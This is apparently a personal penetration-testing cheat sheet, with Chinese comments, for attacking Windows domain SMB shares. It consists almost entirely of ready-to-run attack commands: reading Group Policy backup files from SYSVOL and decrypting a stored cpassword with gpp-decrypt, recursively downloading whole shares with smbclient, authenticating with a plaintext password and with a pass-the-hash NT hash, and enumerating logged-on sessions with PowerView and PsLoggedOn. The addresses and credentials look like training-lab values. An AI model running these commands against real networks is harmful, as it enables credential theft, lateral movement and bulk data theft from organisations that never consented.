- `Policies\oldpolicy\old-policy-backup.xml` && `groups.xml`...一些旧策略文件会有我们想要的东西
# Share Info
```powershell
Get-SmbShare -ComputerName

#PowerView
Find-DomainShare [-CheckShareAccess]
ls \\dc1.corp.com\sysvol\corp.com\ #远程访问
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```
# smbmap
```bash
smbmap -H 172.21.0.0 -d [domain] -u [user] -p [password]

```
# smbclient
```bash
smbclient -L 172.21.0.0
smbclient \\\\x.x.x.x\\Folder # smbclient //x.x.x.x/tmp || '\\x.x.x.x\xx'
#下载所有
smbclient '//192.168.188.248/transfer' -N -c 'prompt OFF;recurse ON;mget *'
smbclient '//172.16.147.21/monitoring' -U relia/jim%'Castello1!' -c 'prompt OFF;recurse ON;mget *'
# pth
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

#Recursively list a directory
smb: \> recurse on             
smb: \> ls
```
# HasSessoin - PowerView
### PowerView
```powershell
#最好添加Verbose来看是没有/无权查看；在Server 2019/10/11均无法运作
   Get-NetSession -ComputerName files04 -Verbose 
   Get-NetSession -ComputerName web04 -Verbose
   
   #查看Get-NetSession的所查询键值的查询权限
   #HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity -> SrvsvcSessionInfo
   Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```
### [PsLoggedOn](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon) From [SysInternals Suite](https://learn.microsoft.com/en-us/sysinternals/).
```powershell
.\PsLoggedon.exe \\files04
```